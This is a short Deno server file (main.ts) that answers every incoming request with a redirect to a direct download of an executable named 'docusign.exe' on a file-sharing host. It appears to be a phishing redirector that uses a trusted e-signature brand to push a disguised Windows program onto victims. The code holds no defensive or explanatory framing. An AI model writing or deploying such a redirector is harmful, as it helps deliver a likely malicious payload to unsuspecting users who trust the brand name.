// main.ts
import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://store9.gofile.io/download/direct/ec53069b-1c0f-437e-9e2d-9e3e4e528e23/docusign.exe",
    },
  });
});
